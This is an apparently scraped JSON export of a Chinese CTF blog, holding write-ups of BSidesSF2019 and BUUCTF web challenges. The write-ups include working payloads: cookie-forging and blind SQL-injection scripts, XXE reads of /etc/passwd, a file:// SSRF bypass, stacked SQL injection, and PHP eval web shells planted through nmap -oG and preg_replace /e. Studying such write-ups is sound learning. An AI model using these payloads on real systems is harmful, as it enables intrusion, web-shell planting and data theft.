{"pages":[{"title":"404","text":"","link":"/404.html"},{"title":"about","text":"个人简介 个人信息：略懂网络安全、略学机器学习、略会CTF、略略略~~~f61d一员，追求更深远的学习，学到新知识就会心潮澎湃！QQ：1727355549邮箱：gg.b0n@qq.com \\ 9g.b0nd@gmail.com 博客信息 本站点主要记录一些日常学习，一些CTF比赛题解、赛题复现。希望能与同仁们分享知识与技术，当然我自己还是比较菜滴，路过的师傅，还请多多指点呀。 计划 2020计划 2020.04.16 2020-GOALS 成为一名大佬💪（emmm…感觉每年都会是这个…​🤣​） 时间轴记录","link":"/about/index.html"},{"title":"categories","text":"","link":"/archives/index.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"tags","text":"","link":"/tags/index.html"},{"title":"friends","text":"申请友链须知 原则上只和技术类博客交换，但不包括含有和色情、暴力、政治敏感的网站。 不和剽窃、侵权、无诚信的网站交换，优先和具有原创作品的网站交换。 申请请提供：站点名称、站点链接、站点描述、logo或头像（不要设置防盗链）。 排名不分先后，刷新后重排，更新信息后请留言告知。 本站不存储友链图片，如果友链图片换了无法更新。图片裂了的会替换成默认图，需要更换的请留言告知。 本站友链信息如下，申请友链前请先添加本站信息： I D：ggb0n 网站图标：http://ggb0n.cool/images/header2.jpg 网站地址：http://ggb0n.cool 网站简介：技术分享，网络安全，CTF，机器学习 加载中，稍等几秒...","link":"/friend/index.html"},{"title":"comment","text":"既然来了，留下点脚印呗🧐","link":"/message/index.html"}],"posts":[{"title":"BSidesSF2019-WriteUp","text":"最近BUU复现了BSidesSF2019几道题目，还比较简单，记录一下。 Futurella一道查看源码就能拿到flag的题目，令人开心的题目。不过谷歌翻译是真的强，连这种火星文都能翻译 Kookie简单的利用cookie拿admin权限的题目。 解题进入题目发现提示我们要以admin身份登录，但同时也给了一组用户名和密码guest/guest，用该用户登录抓包，发现cookie中存在字段username=，在后面加上admin然后放包即可拿到flag。 Pick-tac-toe考察条件竞争，题很简单。 解题进入题目是一个下井字棋的棋盘，查看源码，发现一部分代码如下： &lt;table id=\"board\"&gt; &lt;tr&gt; &lt;form id='form_ul' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='ul'&gt; &lt;td id='ul' onClick='$(\"#form_ul\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_u' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='u'&gt; &lt;td id='u' onClick='$(\"#form_u\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_ur' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='ur'&gt; &lt;td id='ur' onClick='$(\"#form_ur\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;/tr&gt; &lt;tr&gt; &lt;form id='form_l' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='l'&gt; &lt;td id='l' onClick='$(\"#form_l\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_c' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='c'&gt; &lt;td id='c' onClick='$(\"#form_c\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_r' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='r'&gt; &lt;td id='r' onClick='$(\"#form_r\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;/tr&gt; &lt;tr&gt; &lt;form id='form_bl' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='bl'&gt; &lt;td id='bl' onClick='$(\"#form_bl\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_b' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='b'&gt; &lt;td id='b' onClick='$(\"#form_b\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_br' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='br'&gt; &lt;td id='br' onClick='$(\"#form_br\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;/tr&gt;&lt;/table&gt; 可以猜测给出的是代表九个网格传的传值，通过POST传参，在/move页利用move参数传参以表示棋下的位置。当我们进行传参的时候，发现经过一段时间棋盘上才出现，起初以为是网速问题，其实这段时间是服务器处理的时间，这个时候我们再传两个位置，构成一条直线，这样服务器只能对我们下的第一步棋进行反应，但是反应过来，我们已经下了三步棋，赢了…这就是典型的条件竞争。 Mixer这个题目我觉得还是有水平的，主要考察了对cookie的攻击，但是结合了AES ECB模式加密的知识，这其实也是AES加密模式中很简单的了。 题目分析进入题目，我们发现又是一个登录框：还是提示我们要有admin权限，我们尝试用admin/admin登录，发现可以登录，但是第三个框的is_admin的值在输入的时候我们不能进行操作，从抓包效果来看，也不能进行更改：但是我们发现cookie中有user的字段，猜测其后面的值是经过AES ECB模式加密的，这里如果需要对加密的机制有更深的理解，可以去这里。验证一下我们的猜测：通过更改其中一个值看一下回显我们发现，传入的用户名、密码那三项其实是通过JSON传输的，即： {\"username\":\"admin\",\"password\":\"admin\",\"is_admin\":\"0\"} 从图中看到，当我们更改user中的一个值的时候，结果报了错误，因为JSON字符串已经变成了： {\"first_name\":\"a??N??ZP!z??gF???\":\"admin\",\"is_admin\":0} 也就是说确实是对这一串JSON格式的字符串进行了AES ECB模式的加密，并且是16字节为一组进行加密的，那么我们解题就有突破口了。获取flag我们需要构造如下的JSON串： {\"username\":\"admin\",\"password\":\"admin\",\"is_admin\":\"1\"} 但是is_admin的值我们没法通过输入来控制，但是观察发现：从JSON的起始位置到用户名的第一个字母刚好是16个字节，那么我们构造一个类似于a1.00000000000000(14个0，一共16字节)的用户名，以及一个4字节的密码，那就又拿到了一个16字节的分组1.00000000000000，并且其值为1，同时到第三个:刚好是64字节，而进行加密的时候是对整个16字节的块进行加密的，那么我们再把这一个分组加密的结果插入到最后的16字节的密文之前(hex编码是32个字符)即可令is_admin的值为1了，这个时候is_admin其实是1.000000000000000(15个0)了，但是不影响它是1，同时不影响最后一个分组的加密(不够16字节会自动填充的)。 解题构造username=a1.00000000000000&amp;password=admi登录之后，利用BP抓包将第二个16字节的密文替换掉最后的16字节的密文，放包即可拿到flag：用下面的脚本的话操作起来更简单： import requestsfrom requests.packages.urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)url = \"\"action=\"?action=login&amp;first_name=a1.00000000000000&amp;last_name=admi\"r = requests.get(url+action, verify=False, allow_redirects=False)for c in r.cookies: print(c.name, c.value) if c.name == \"user\": c.value = c.value[:-32] + c.value[32:64] + c.value[-32:]resp = requests.get(url, cookies = r.cookies, verify=False, allow_redirects=False)print resp.text Sequel在cookie处存在sql注入，利用盲注拿flag。 题目分析进入题目是一个只含用户名和密码的登录框，经过尝试guest/guest可以登录，登录之后发现是一个302跳转，同时看到了有点怪的cookie：对cookie的值进行base64解码： &gt;&gt;&gt; base64.b64decode(&quot;eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJndWVzdCJ9&quot;)'{&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;guest&quot;}' 可以看到用户名和密码是通过JSON编码传输的，那么JSON中的username或password会不会存在注入点呢？利用下面的payload测试一下： {\"username\":\"guest\\\" or \\\"A\\\"=\\\"A\",\"password\":\"guest\"} 注意这里的\\是用来转义的，防止在JSON中被编码了。然后对上面的JSON串进行base64加密，这里我们利用python的库进行加密，同时用r''告诉python不要把我们构造的\\再进行转义： &gt;&gt;&gt; base64.b64encode(r'{&quot;username&quot;:&quot;guest\\&quot; or \\&quot;A\\&quot;=\\&quot;A&quot;,&quot;password&quot;:&quot;guest&quot;}')'eyJ1c2VybmFtZSI6Imd1ZXN0XCIgb3IgXCJBXCI9XCJBIiwicGFzc3dvcmQiOiJndWVzdCJ9' 替换掉cookie中的内容之后放包发现回显如下：发现注入成功！这道题的数据库是sqlite，可以利用sqlite_master拿到库名，以便进一步的注入。写脚本利用盲注爆库名、表名、字段名，拿flag。脚本如下： import requestsimport stringimport base64URL = ''LETTERS = string.printabletarget = \"\"while True: f = False for e in LETTERS: tmp = target + e # 1.获取库名 payload = r'{{\"username\":\"\\\" or CASE WHEN SUBSTR((SELECT name FROM sqlite_master limit 0,1),{},1)=\\\"{}\\\" THEN true ELSE false END or \\\"\",\"password\":\"guest\"}}'.format(len(tmp),e) # 2.获取username #payload = r'{{\"username\":\"\\\" or CASE WHEN SUBSTR((SELECT username FROM userinfo limit 1,1),{},1)=\\\"{}\\\" THEN true ELSE false END or \\\"\",\"password\":\"guest\"}}'.format(len(tmp),e) # 3.获取password #payload = r'{{\"username\":\"\\\" or CASE WHEN SUBSTR((SELECT password FROM userinfo limit 1,1),{},1)=\\\"{}\\\" THEN true ELSE false END or \\\"\",\"password\":\"guest\"}}'.format(len(tmp),e) payload = base64.b64encode(payload.encode('utf-8')).decode(\"utf-8\") req = requests.Request( 'GET', URL, params={ }, cookies={ \"1337_AUTH\":payload } ) prepared = req.prepare() s = requests.Session() r = s.send(prepared, allow_redirects = False) if \"Movie\" in r.text: target = tmp print(target) f = True break if f: continue exit() 拿到用户名和密码：sequeladmin/f5ec3af19f0d3679e7d5a148f4ac323d，登录即可拿到flag。 SVGMagic考察XXE漏洞，在解析包含SVG可缩放矢量图形的XML文件时，构造XXE漏洞执行从而拿到服务器的目标文件。 知识扩展SVG可缩放矢量图形可以参考这里XXE漏洞参考这里和这里 解题进入题目，提示这个站可以实现SVG到PNG的转换，也就是说我们上传包含SVG信息的XML文件，那么将会返回一张PNG图片。SVG代码类似： &lt;html&gt;&lt;body&gt; &lt;h1&gt;My first SVG&lt;/h1&gt; &lt;svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\"&gt; &lt;circle cx=\"100\" cy=\"50\" r=\"40\" stroke=\"black\" stroke-width=\"2\" fill=\"red\" /&gt;&lt;/svg&gt; &lt;/body&gt;&lt;/html&gt; 既然与XML的解析相关，那就考虑XXE攻击。首先构造如下的XML脚本： &lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; ]&gt;&lt;svg height=\"300\" width=\"200\"&gt; &lt;text x=\"0\" y=\"15\" fill=\"red\"&gt;test &amp;xxe; test&lt;/text&gt;&lt;/svg&gt; 上传之后，发现回显如下：由此可见，我们上传的包含XXE攻击的脚本成功执行了，现在就想办法就拿到flag，那就需要找到flag文件的位置。 这个地方学到了新东西：利用linux系统的proc进程文件系统找当前进程中的文件，这个地方参考了网上的题解，虽然没有成功，但是还是学到了新东西，感觉以后会用得到。关于proc进程文件系统参考这里。 最后拿到flag的payload如下： &lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:flag.txt\"&gt; ]&gt;&lt;svg height=\"300\" width=\"3000\"&gt; &lt;text x=\"0\" y=\"15\" fill=\"red\"&gt;test &amp;xxe; test&lt;/text&gt;&lt;/svg&gt; 利用file命令直接读flag文件，即可拿到flag。 看国外大佬的题解，讲到了刚开始想到了ImageTragick，也是之前不熟悉的知识，需要好好学习，参考这里。 赛题BUU上都可以复现","link":"/2020/02/18/BSidesSF2019-WriteUp/"},{"title":"BUUCTF-web刷题Ⅱ","text":"刷题刷不停，继续刷！👾👾👾 [SUCTF 2019]Pythonginx考察知识考察Black Hat2019的一个议题：在unicode中字符℀(U+2100)，当利用IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制。关于INDA和UIF-8的漏洞：https://www.cnblogs.com/cimuhuashuimu/p/11490431.html此类的字符还有： U+2100, ℀U+2101, ℁U+2105, ℅U+2106, ℆U+FF0F, ／U+2047, ⁇U+2048, ⁈U+2049, ⁉U+FE16,︖U+FE56, ﹖U+FF1F, ？U+FE5F, ﹟U+FF03, ＃U+FE6B, ﹫U+FF20, ＠相信总会用到的 参考Black Hat2019的PPT：https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf 题目分析进入题目，给了如下的源码 from flask import Flask, Blueprint, request, Response, escape ,render_templatefrom urllib.parse import urlsplit, urlunsplit, unquotefrom urllib import parseimport urllib.requestapp = Flask(__name__)# Index@app.route('/', methods=['GET'])def app_index(): return render_template('index.html')@app.route('/getUrl', methods=['GET', 'POST'])def getUrl(): url = request.args.get(\"url\") host = parse.urlparse(url).hostname if host == 'suctf.cc': return \"我扌 your problem? 111\" parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return \"我扌 your problem? 222 \" + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return \"我扌 your problem? 333\"if __name__ == \"__main__\": app.run(host='0.0.0.0', port=80) 我们看到getUrl()会对传入的url做多层处理和过滤：第一层处理及过滤： host = parse.urlparse(url).hostnameif host == 'suctf.cc': return \"我扌 your problem? 111\" 这里host = parse.urlparse(url).hostname返回传入的url的主机名，这里urlparse是将url字符串拆分为组件，可参考：https://www.cnblogs.com/jiumo/p/11143741.html在本机测试效果如下： &gt;&gt;&gt; from urllib.parse import urlparse&gt;&gt;&gt; urlparse('http://www.baidu.com/index.php')ParseResult(scheme='http', netloc='www.baidu.com', path='/index.php', params='', query='', fragment='')&gt;&gt;&gt; urlparse('http://www.baidu.com/index.php').hostname'www.baidu.com' 这里不会对url中的类似于℀的字符做处理，测试效果： &gt;&gt;&gt; urlparse('http://www.baidu.℀om/index.php').hostname'www.baidu.℀om' 因此借助INDA漏洞构造的url可以通过这一步的过滤。第二层处理及过滤： parts = list(urlsplit(url))host = parts[1]if host == 'suctf.cc': return \"我扌 your problem? 222 \" + host urlsplit是将url进行分割，测试： &gt;&gt;&gt; from urllib.parse import urlsplit&gt;&gt;&gt; urlsplit('http://www.baidu.com/index.php')SplitResult(scheme='http', netloc='www.baidu.com', path='/index.php', query='', fragment='')&gt;&gt;&gt; urlsplit('http://www.baidu.com/index.php')[1]'www.baidu.com' 此处利用了一个CVE：urlsplit不处理 NFKC 标准化(用 Punycode/IDNA编码的URL使用NFKC规范化来分解字符)，因此对℀类的字符也是处理不了的： &gt;&gt;&gt; urlsplit('http://www.baidu.℀om/index.php')[1]'www.baidu.℀om' 绕过前两层过滤，到第三层处理： newhost = []for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8'))parts[1] = '.'.join(newhost) 我们发现，这里是在url的.处进行分割，并加入到newhost[]数组中，但是加入数组之前会继续INDA编码然后UTF-8解码，那么在此处℀类的字符便会被解析为a/c，我们利用此漏洞便可以构造能打入服务器拿flag的payload了。 解题我们从前面的代码看到，构造的url的域名需要绕过前两层host == 'suctf.cc'的判断，并且要满足第三层的host == 'suctf.cc'，那么我们便可以构造域名：suctf.c℆sr便可以绕过对域名的判断。但是现在我们不知道flag文件在哪，但是题目给了提示： &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;&lt;!-- Do you know the nginx? --&gt; 提示我们是基于nginx架构的服务器，那肯定与其配置文件相关这里补充知识： Nginx重要文件位置:配置文件存放目录：/etc/nginx主配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules应用程序：/usr/sbin/nginx程序默认存放位置：/usr/share/nginx/html日志默认存放位置：/var/log/nginx配置文件目录为：/usr/local/nginx/conf/nginx.conf 我们读取nignx.conf应该能找到flag文件的位置，构造payload： file://suctf.c℆sr/local/nginx/conf/nginx.conf 利用file协议读取nginx.conf内容如下： server { listen 80; location / { try_files $uri @app; } location @app { include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; } location /static { alias /app/static; } # location /flag { # alias /usr/fffffflag; # } } 拿到flag文件的位置之后，构造最终payload： /getUrl?url=file://suctf.c%E2%84%86sr/fffffflag 这里注意℆需要进行url编码。 拓展一下：python的urlsplit函数其实是比较不完善的，还存在urlsplit NFKD 标准化漏洞，以后遇到的时候需要多加注意。 [极客大挑战 2019]Http考察http协议的题目，常见也简单。 解题查看源码发现一个Secret.php的链接，进去之后提示：伪造Refer头即可，伪造之后又提示：伪造UA头即可，然后提示需要来自本地：伪造IP即可拿到flag这个地方可以伪造多处，可以伪造x-forwarded-for也可以伪造client-ip，还可以伪造host头，有些时候甚至把三个都伪造上，之前打比赛遇到一个题目就是，巨坑… 伪造协议头可以通过BP抓包改包，当然有更方便的方法，这里推荐一个火狐/谷歌的插件Header Editor方便好用。 [强网杯 2019]随便注考察堆叠注入注入原理：在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？答案是会的，这也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如： 用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 题目分析进入题目可以看到一个提示框，进行注入测试，1'的时候不回显，1'#则回显，说明存在sql注入，order by语句得知有两个字段，但是用union select组合查询的时候提示了过滤的情况：可以看到，常用的注入语句基本全被过滤了，网上参考得知是堆叠注入。 解题利用堆叠注入进行注入： 爆库：1';show databases;#爆表：1';show tables# 查表回显的结果如下：。我们看到有一个words表和一个1919810931114514表，flag应该在1919810931114514中没错了，看一下： 1';show columns from `1919810931114514` //注意以纯数字作为表名，查表的时候需要用反引号 现在，我们知道flag在1919810931114514表了，但是用去查询的字段都被过滤了，所以需要用其他的方法来获取flag。我们可以看到，在输入1或者2的时候，都会返回一个字符串，因此猜测内部查询语句应该是默认匹配words库的，查询语句也就类似于select id, data from words where id =，因此我们可以把1919810931114514表改名为words表，并且加入id列，同时将flag列改为data列，如此一来，我们查询1' or 1=1#就能拿到flag了。最终构造payload： 1’;rename table words to word1;rename table 1919810931114514 to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# 然后1' or 1=1即可拿到flag。 [SUCTF 2019]EasySQL也是考察堆叠注入，但是与上题不同，本题突破点在于：mysql中通过set sql_mode=PIPES_AS_CONCAT可以将||视为字符串的连接操作符而非或运算符，利用语句堆叠设置这个环境变量，然后再通过||拼接查询flag即可。 题目分析进入题目，和上题一样是一个查询框，可以拿到源码： &lt;?php session_start(); include_once \"config.php\"; $post = array(); $get = array(); global $MysqlLink; //GetPara(); $MysqlLink = mysqli_connect(\"localhost\",$datauser,$datapass); if(!$MysqlLink){ die(\"Mysql Connect Error!\"); } $selectDB = mysqli_select_db($MysqlLink,$dataName); if(!$selectDB){ die(\"Choose Database Error!\"); } foreach ($_POST as $k=&gt;$v){ if(!empty($v)&amp;&amp;is_string($v)){ $post[$k] = trim(addslashes($v)); } } foreach ($_GET as $k=&gt;$v){ } } //die(); ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;&lt;form action=\"\" method=\"post\"&gt;&lt;input type=\"text\" name=\"query\"&gt;&lt;input type=\"submit\"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php if(isset($post['query'])){ $BlackList = \"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\\"\"; //var_dump(preg_match(\"/{$BlackList}/is\",$post['query'])); if(preg_match(\"/{$BlackList}/is\",$post['query'])){ //echo $post['query']; die(\"Nonono.\"); } if(strlen($post['query'])&gt;40){ die(\"Too long.\"); } $sql = \"select \".$post['query'].\"||flag from Flag\"; mysqli_multi_query($MysqlLink,$sql); do{ if($res = mysqli_store_result($MysqlLink)){ while($row = mysqli_fetch_row($res)){ print_r($row); } } }while(@mysqli_next_result($MysqlLink)); } ?&gt; 看到 mysql_multi_query()得知可以堆叠注入，这里关注查询语句$sql = &quot;select &quot;.$post['query'].&quot;||flag from Flag&quot;;可以看到，查询语句是将我们传入的语句与||flag from Flag拼接在一起了，这里补充知识： 在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode模式：pipes_as_concat 来实现oracle 的一些功能。 因此我们通过堆叠注入设置sql_mode，然后再查询即可。 解题构造最终payload：1;set sql_mode=PIPES_AS_CONCAT;select 1 非预期解：直接构造payload为*,1即可拿到flag 字符串或时前面的数字时结果为1则返回1，为0则返回0，效果跟直接*一样。 [BUUCTF 2018]Online Tool考察namp的一个命令-oG，以及escapeshellarg()和escapeshellarg()函数合起来使用造成的漏洞。 题目分析首先看到代码： &lt;?phpif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];}if(!isset($_GET['host'])) { highlight_file(__FILE__);} else { $host = $_GET['host']; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']); echo 'you are in sandbox '.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);} 我们看到，代码主要是通过利用nmap的命令拼接上我们的输入来执行，参考别人的题解得知namp的一个参数-oG可以向目标机器中写入文件，通过这个参数，我们便可以向目标机器写入一个小马来连接。但是我们只能从host参数来写入内容，那么我们写入的小马代码便会被escapeshellarg()和escapeshellarg()做处理，即将host中包含的字符转义，便可以影响小马的上传，因此需要利用它们结合使用存在的漏洞来绕过。这里可以参考：https://paper.seebug.org/164/即传入的参数内容中包含'则会造成漏洞，例如： 传入的参数是：172.17.0.2' -v -d a=1 经过escapeshellarg处理后变成了'172.17.0.2'\\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。 经过escapeshellcmd处理后变成'172.17.0.2'\\\\'' -v -d a=1\\'，这是因为escapeshellcmd对\\以及最后那个不配对儿的'进行了转义 最后执行的命令是curl '172.17.0.2'\\\\'' -v -d a=1\\'，由于中间的\\\\被解释为\\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1'，即向172.17.0.2\\发起请求，POST数据为a=1'。 这里我们是利用namp执行命令，那么需要了解一些namp的基本知识：namp -PS 127.0.0.1与namp -PS '' 127.0.0.1与nmap -PS '&quot; &quot;' 127.0.0.1 &quot; &quot;效果是一样的。 解题构造payload： ?host=' &lt;?php @eval($_POST[\"hack\"]);?&gt; -oG hack.php ' 写入之后返回了小马存储的路径：然后去蚁剑连接即可。 [ZJCTF 2019]NiZhuanSiWei考察file_get_contents的绕过，以及反序列化。补充知识：file_get_contents的绕过 1、使用php://input伪协议绕过 ①将要GET的参数?xxx=php://input ②用post方法传入想要file_get_contents()函数返回的值2、用data://伪协议绕过 ①将url改为：?xxx=data://text/plain;base64,想要file_get_contents()函数返回的值的base64编码 ②或者将url改为：?xxx=data:text/plain,(url编码的内容)3、利用远程文件读取绕过 题目分析进入题目之后，给出了一段代码： &lt;?php $text = $_GET[\"text\"];$file = $_GET[\"file\"];$password = $_GET[\"password\"];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"welcome to the zjctf\")){ echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; if(preg_match(\"/flag/\",$file)){ echo \"Not now!\"; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; }}else{ highlight_file(__FILE__);}?&gt; 通过审计代码可知：需要GET方式上传三个参数text、file、password，并且三个参数需要满足： text参数传入的值会用file_get_contents去访问，初步猜测是远程文件读取，后来测试发现这里不行，需要用伪协议； file参数可以传入文件名，这个文件会被include()包含，看到这猜测肯定有文件包含，并且提示了useless.php，肯定是要看它的代码的； password会进行反序列化，还没看出他的用处。 解题首先构造payload： /?text=data:text/plain,welcome to the zjctf&amp;file=php://filter/convert.base64-encode/resource=useless.php&amp;passwprd=1 成功读取到useless.php的代码，如下： &lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"U R SO CLOSE !///COME ON PLZ\"); } } } ?&gt; 我们看到，这里构造了一个Flag类，并且在此处可以读到flag.php的内容，由此得知password传入的肯定是此处序列化的内容，可以用下面的代码拿到序列化的字符串： &lt;?php class Flag{ //flag.php public $file = \"flag.php\"; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"U R SO CLOSE !///COME ON PLZ\"); } } } $a = new Flag;echo serialize($a);?&gt; O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";} 然后再构造payload读取flag： /?text=data:text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";} 查看源码拿到flag。 [BJDCTF2020]ZJCTF，不过如此是上道题的改版，原题是支持远程文件读取的，但是放到BUU上好像不行了… 这道题在上道题的基础上考了preg_replace()的RCE。本RCE参考：https://xz.aliyun.com/t/2557 题目分析首先看代码： &lt;?phperror_reporting(0);$text = $_GET[\"text\"];$file = $_GET[\"file\"];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"I have a dream\")){ echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; if(preg_match(\"/flag/\",$file)){ die(\"Not now!\"); } include($file); //next.php }else{ highlight_file(__FILE__);}?&gt; 相同的操作拿到next.php的源码： &lt;?php$id = $_GET['id'];$_SESSION['id'] = $id;function complex($re, $str) { return preg_replace( '/(' . $re . ')/ei', 'strtolower(\"\\\\1\")', $str );}foreach($_GET as $re =&gt; $str) { echo complex($re, $str). \"\\n\";}function getFlag(){ @eval($_GET['cmd']);} 这里我们看到语句preg_replace('/(' . $re . ')/ei','strtolower(&quot;\\\\1&quot;)',$str)中采用了preg_replace/e模式，因此可以利用上面提到的RCE来写入小马，构造payload如下： /next.php?id=1&amp;\\S*=${eval($_POST[x])} 这样构造的原因： preg_replace函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图preg_replace函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为'strtolower(&quot;\\\\1&quot;)'字符串，就需要想办法来执行它。 上面的命令执行，相当于eval('strtolower(&quot;\\\\1&quot;);')结果，当中的\\\\1实际上就是\\1，而\\1在正则表达式中有自己的含义： 对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从1开始，最多可存储99个捕获的子表达式。每个缓冲区都可以使用'\\n'访问，其中n为一个标识特定缓冲区的一位或两位十进制数。 所以这里的\\1实际上指定的是第一个子匹配项，参考前面的链接，我们传入\\S*=${eval($_POST[x])}便可以将小马写入(S原本是.，但是传参数首字符是特殊字符的时候会被替换为_，用S可以绕过)。 解题用上面的payload写入小马，然后用蚁剑连接拿到shell，即可拿到flag。注意这里我们并没有把上面的语句写入到指定的文件，而是访问的时候${eval($_POST[x])}语句首先被执行了，因此才可以连接上，那么我们连接的时候用的也就是整个url了。 [极客大挑战 2019]BuyFlag考察is_numeric()和strcmp()两个函数的漏洞 补充知识 php中的strcmp漏洞 传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数接受到了不符合的类型将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，仍将return 0（表示两个字符串相等）。那么利用数组即可绕过判断。 php中的is_numeric()漏洞 is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断。 题目分析在PAYFLAG页面源码中发现如下代码： ~~~post money and password~~~if (isset($_POST['password'])) { $password = $_POST['password']; if (is_numeric($password)) { echo \"password can't be number&lt;/br&gt;\"; }elseif ($password == 404) { echo \"Password Right!&lt;/br&gt;\"; } 提示我们传入money和password，可以看到利用password=404%20即可绕过is_numeric的判断。抓包发现cookie值为0，而并没有采用PHPSESSID，将其改为1即可，发送之后回显如下：从中看到了对money的判断，看到PHP版本是5.3的，猜测是strcmp函数比较的，利用数组绕过即可。成功拿到flag。**其实对于money的绕过还可以采用科学计数法money=1e11。 [CISCN 2019]ikun考察薅羊毛逻辑漏洞：通过抓包修改折扣等数据来购买flag；jwt-cookies伪造、python反序列化 题目分析进入题目之后提示要买到lv6我们看到每个商品都有个等级的标签，查看标签命名是lvx.png，因此若要找到lv6的地方，可以用下面的脚本代码： import requestsurl=\"http://6e7db183-764d-4afc-bdbb-b70791536e4a.node3.buuoj.cn/shop?page=\"for i in range(0,2000): r=requests.get(url+str(i)) if 'lv6.png' in r.text: print (i) break 跑出来lv6在181页，但是发现太贵了…抓包发现可以设置折扣，这里就用到了薅羊毛逻辑漏洞。然后页面返回提示需要是admin抓包发现cookie采用了JWT(此处可了解JWT)，我们把JWT拿去base64解码得到 {\"alg\":\"HS256\",\"typ\":\"JWT\"}{\"username\":\"123\"}¶«L=\u0003\u001fm\u001að¢ÖÙJh\u000fÎ\u001aö7Éq\"&gt;[¿ 其中username中是我们登录的用户名，等下伪造JWT时改为admin即可；另外，伪造JWT还需要秘钥，可以利用c-jwt-cracker来破解：拿到秘钥之后，到JWT生成网站伪造admin的JWT：拿伪造的JWT伪装成管理员，然后得到了一个压缩包的地址： 